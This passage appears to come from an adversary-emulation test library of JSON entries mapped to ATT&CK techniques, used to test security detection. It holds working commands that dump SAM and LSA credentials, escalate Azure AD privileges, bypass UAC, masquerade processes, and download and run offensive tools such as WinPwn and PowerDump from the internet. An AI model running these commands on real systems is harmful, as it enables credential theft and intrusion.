		"dependencies": [
			{
				"description": "MSOnline module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name MSOnline -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name MSOnline -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module MSOnline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\n",
			"cleanup_command": "Remove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Simulate - Post BEC persistence via user password reset followed by user added to company administrator role",
		"auto_generated_guid": "14f3af20-61f1-45b8-ad31-4637815f3f44",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"auth_username": {
				"description": "Azure AD username used to conduct the adversary activity",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"auth_password": {
				"description": "Azure AD password for user auth_username",
				"type": "string",
				"default": "p4sswd"
			},
			"target_user": {
				"description": "Name of the user whose password be reset and added to the admin role.",
				"type": "string",
				"default": "default"
			},
			"target_password": {
				"description": "The password that the user target_user will be reset to.",
				"type": "string",
				"default": "Ohn05GeMe#$"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "MSOnline and AzureAD modules must be installed.\n",
				"prereq_command": "$required_mods = 'AzureAD', 'MSOnline'\n$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)\n$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue\n\nif ($notInstalled) {\n# Prompt for installing the missing ones.\nWrite-Output \"The following PS modules aren't currently installed:\"\n$notInstalled\n  exit 1\n}\n\n else{\n  Write-Output \"All required PS modules are installed\"\n  exit 0\n }\n",
				"get_prereq_command": "Install-Module -Name MSOnline -Scope CurrentUser -Force\nInstall-Module -Name AzureAD -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module MSOnline\nImport-Module AzureAD\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\n$targetsecurepw = ConvertTo-SecureString -String \"#{target_password}\" -AsPlainText -Force\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\n\n#Saving the ObjectId of the target_user into a variable\n$target_objid = Get-AzureADUser -filter \"userPrincipalName eq '#{target_user}'\" | Select-Object -ExpandProperty ObjectId\n\n#Reset the password of the target_user\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\n\n#Adding target_user\nAdd-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberEmailAddress \"#{target_user}\"\nAdd-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberEmailAddress \"#{target_user}\"\n",
			"cleanup_command": "Import-Module MSOnline\n$password = ConvertTo-SecureString -String \"#{auth_password}\" -AsPlainText -Force\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{auth_username}\", $password\nConnect-MsolService -Credential $credential\nRemove-MsolRoleMember -RoleName \"Company Administrator\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\nRemove-MsolRoleMember -RoleName \"Global Reader\" -RoleMemberType User -RoleMemberEmailAddress \"#{target_user}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098.003",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Registry dump of SAM, creds, and secrets",
		"auto_generated_guid": "5c2571d0-1572-416d-9676-812e64ca9f44",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
			"cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Registry parse with pypykatz",
		"auto_generated_guid": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"venv_path": {
				"description": "Path to the folder for the tactics venv",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must have python 3 installed\n",
				"prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
			},
			{
				"description": "Computer must have venv configured at #{venv_path}\n",
				"prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "py -m venv \"#{venv_path}\"\n"
			},
			{
				"description": "pypykatz must be installed \n",
				"prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
			}
		],
		"executor": {
			"command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "esentutl.exe SAM copy",
		"auto_generated_guid": "a90c2f4d-6726-444e-99d2-a00cd7c20480",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "Path to the file to copy",
				"type": "path",
				"default": "%SystemRoot%/system32/config/SAM"
			},
			"file_name": {
				"description": "Name of the copied file",
				"type": "string",
				"default": "SAM"
			},
			"copy_dest": {
				"description": "Destination of the copied file",
				"type": "string",
				"default": "%temp%"
			}
		},
		"executor": {
			"command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n",
			"name": "command_prompt",
			"elevation_required": true,
			"cleanup_command": "del #{copy_dest}\\#{file_name} >nul 2>&1\n"
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "PowerDump Hashes and Usernames from Registry",
		"auto_generated_guid": "804f28fc-68fc-40da-b5a2-e9d0bce5c193",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "PowerDump script must exist on disk at specified location",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1} ",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\""
			}
		],
		"executor": {
			"command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "dump volume shadow copy hives with certutil",
		"auto_generated_guid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_hive": {
				"description": "Hive you wish to dump",
				"type": "string",
				"default": "SAM"
			},
			"limit": {
				"description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
				"type": "integer",
				"default": 10
			}
		},
		"executor": {
			"command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n",
			"name": "command_prompt",
			"elevation_required": false,
			"cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)\n"
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "dump volume shadow copy hives with System.IO.File",
		"auto_generated_guid": "9d77fed7-05f8-476e-a81b-8ff0472c64d0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_hive": {
				"description": "Hive you wish to dump",
				"type": "string",
				"default": "SAM"
			},
			"limit": {
				"description": "Limit to the number of shadow copies to iterate through when trying to copy the hive",
				"type": "integer",
				"default": 10
			}
		},
		"executor": {
			"command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n",
			"name": "powershell",
			"elevation_required": false,
			"cleanup_command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n"
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
		"auto_generated_guid": "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Dumping of SAM, creds, and secrets(Reg Export)",
		"auto_generated_guid": "21df41be-cdd8-4695-a650-c3981113aa3c",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security\n",
			"cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Masquerading as Windows LSASS process",
		"auto_generated_guid": "5ba5a3d1-cf3c-4499-968a-a93155d1f717",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n",
			"cleanup_command": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading as FreeBSD or Linux crond process.",
		"auto_generated_guid": "a315bfff-7a98-403b-b442-2ea1b255e556",
		"supported_platforms": ["linux"],
		"executor": {
			"command": "cp /bin/sh /tmp/crond;\necho 'sleep 5' | /tmp/crond\n",
			"cleanup_command": "rm /tmp/crond\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading - cscript.exe running as notepad.exe",
		"auto_generated_guid": "3a2a578b-0a01-46e4-92e3-62e2859b42f0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n",
			"cleanup_command": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading - wscript.exe running as svchost.exe",
		"auto_generated_guid": "24136435-c91a-4ede-9da1-8b284a1c1a23",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Wscript file to execute must exist on disk\n",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n"
			}
		],
		"executor": {
			"command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"\n",
			"cleanup_command": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading - powershell.exe running as taskhostw.exe",
		"auto_generated_guid": "ac9d0fc3-8aa8-4ab5-b11f-682cd63b40aa",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n",
			"cleanup_command": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading - non-windows exe running as windows exe",
		"auto_generated_guid": "bc15c13f-d121-4b1f-8c7d-28d95854d086",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"outputfile": {
				"description": "path of file to execute",
				"type": "path",
				"default": "($env:TEMP + \"\\svchost.exe\")"
			},
			"inputfile": {
				"description": "path of file to copy",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n",
				"prereq_command": "if (Test-Path \"#{inputfile}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{inputfile}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/bin/T1036.003.exe\" -OutFile \"#{inputfile}\"\n"
			}
		],
		"executor": {
			"command": "copy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003\n",
			"cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Masquerading - windows exe running as different windows exe",
		"auto_generated_guid": "c3d24a39-2bfe-4c6a-b064-90cd73896cb0",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"outputfile": {
				"description": "path of file to execute",
				"type": "path",
				"default": "($env:TEMP + \"\\svchost.exe\")"
			},
			"inputfile": {
				"description": "path of file to copy",
				"type": "path",
				"default": "$env:ComSpec"
			}
		},
		"executor": {
			"command": "copy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003\n",
			"cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Malicious process Masquerading as LSM.exe",
		"auto_generated_guid": "83810c46-f45e-4485-9ab6-8ed0e9e6ed7f",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt\n",
			"cleanup_command": "del C:\\T1036.003.txt >nul 2>&1\ndel C:\\lsm.exe >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "File Extension Masquerading",
		"auto_generated_guid": "c7fa0c3b-b57f-4cba-9118-863bf4e653fc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_path": {
				"description": "path to exe to use when creating masquerading files",
				"type": "path",
				"default": "C:\\Windows\\System32\\calc.exe"
			},
			"vbs_path": {
				"description": "path of vbs to use when creating masquerading files",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.vbs"
			},
			"ps1_path": {
				"description": "path of powershell script to use when creating masquerading files",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1036.003\\src\\T1036.003_masquerading.ps1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "File to copy must exist on disk at specified location (#{vbs_path})\n",
				"prereq_command": "if (Test-Path \"#{vbs_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{vbs_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.vbs\" -OutFile \"#{vbs_path}\"\n"
			},
			{
				"description": "File to copy must exist on disk at specified location (#{ps1_path})\n",
				"prereq_command": "if (Test-Path \"#{ps1_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{ps1_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.003/src/T1036.003_masquerading.ps1\" -OutFile \"#{ps1_path}\"\n"
			}
		],
		"executor": {
			"command": "copy \"#{exe_path}\" %temp%\\T1036.003_masquerading.docx.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.003_masquerading.pdf.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.003_masquerading.ps1.exe /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.xls.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.xlsx.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.003_masquerading.png.vbs /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.doc.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.pdf.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.003_masquerading.rtf.ps1 /Y\n%temp%\\T1036.003_masquerading.docx.exe\n%temp%\\T1036.003_masquerading.pdf.exe\n%temp%\\T1036.003_masquerading.ps1.exe\n%temp%\\T1036.003_masquerading.xls.vbs\n%temp%\\T1036.003_masquerading.xlsx.vbs\n%temp%\\T1036.003_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.003_masquerading.rtf.ps1\n",
			"cleanup_command": "del /f %temp%\\T1036.003_masquerading.docx.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.pdf.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.ps1.exe > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.xls.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.xlsx.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.png.vbs > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.doc.ps1 > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.pdf.ps1 > nul 2>&1\ndel /f %temp%\\T1036.003_masquerading.rtf.ps1 > nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1036.003",
		"phases": ["defense-evasion"]
	},
	{
		"name": "EXO - Full access mailbox permission granted to a user",
		"auto_generated_guid": "17d046be-fdd0-4cbb-b5c7-55c85d9d0714",
		"supported_platforms": ["office-365"],
		"input_arguments": {
			"username": {
				"description": "office-365 username",
				"type": "string",
				"default": "o365_user_test@contoso.com"
			},
			"password": {
				"description": "office-365 password",
				"type": "string",
				"default": "o365_password_test"
			},
			"delegate_target": {
				"description": "office-365 target_email",
				"type": "string",
				"default": "delegate@contoso.com"
			},
			"operator_mailbox": {
				"description": "office-365 target_email",
				"type": "string",
				"default": "operator@contoso.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ExchangeOnlineManagement PowerShell module must be installed\n",
				"prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \n"
			}
		],
		"executor": {
			"command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nAdd-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All\nDisconnect-ExchangeOnline -Confirm:$false\n",
			"cleanup_command": "Import-Module ExchangeOnlineManagement\n$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nRemove-MailboxPermission -Identity \"#{delegate_target}\" -User \"#{operator_mailbox}\" -AccessRights FullAccess -InheritanceType All -Confirm:$false\nDisconnect-ExchangeOnline -Confirm:$false\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098.002",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Copy a sensitive File over Administrative share with copy",
		"auto_generated_guid": "6ed67921-1774-44ba-bac6-adb51ed60660",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote": {
				"description": "Remote server name",
				"type": "string",
				"default": "127.0.0.1"
			},
			"share_file": {
				"description": "Remote Path to the file",
				"type": "path",
				"default": "Windows\\temp\\Easter_Bunny.password"
			},
			"local_file": {
				"description": "Local name",
				"type": "string",
				"default": "Easter_egg.password"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Administrative share must exist on #{remote}\n",
				"prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"
			},
			{
				"description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n",
				"prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"
			}
		],
		"executor": {
			"command": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}",
			"cleanup_command": "del \\\\#{remote}\\C$\\#{share_file}\ndel %TEMP%\\#{local_file}",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1039",
		"phases": ["collection"]
	},
	{
		"name": "Copy a sensitive File over Administrative share with Powershell",
		"auto_generated_guid": "7762e120-5879-44ff-97f8-008b401b9a98",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote": {
				"description": "Remote server name",
				"type": "string",
				"default": "127.0.0.1"
			},
			"share_file": {
				"description": "Remote Path to the file",
				"type": "path",
				"default": "Windows\\temp\\Easter_Bunny.password"
			},
			"local_file": {
				"description": "Local name",
				"type": "string",
				"default": "Easter_egg.password"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Administrative share must exist on #{remote}\n",
				"prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"
			},
			{
				"description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n",
				"prereq_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"
			}
		],
		"executor": {
			"command": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"",
			"cleanup_command": "Remove-Item -Path \"\\\\#{remote}\\C$\\#{share_file}\"\nRemove-Item -Path \"$Env:TEMP\\#{local_file}\"",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1039",
		"phases": ["collection"]
	},
	{
		"name": "Bypass UAC using Event Viewer (cmd)",
		"auto_generated_guid": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n",
			"cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using Event Viewer (PowerShell)",
		"auto_generated_guid": "a6ce9acf-842a-4af6-8f79-539be7608e2b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
			"cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using Fodhelper",
		"auto_generated_guid": "58f641ea-12e3-499a-b684-44dee46bd182",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
			"cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1548.002",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Bypass UAC using Fodhelper - PowerShell",
		"auto_generated_guid": "3f627297-6c38-4e7d-a278-fc2563eaaeaa",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"executable_binary": {
				"description": "Binary to execute with UAC Bypass",
				"type": "path",
				"default": "C:\\Windows\\System32\\cmd.exe"
			}
		},
		"executor": {
			"command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
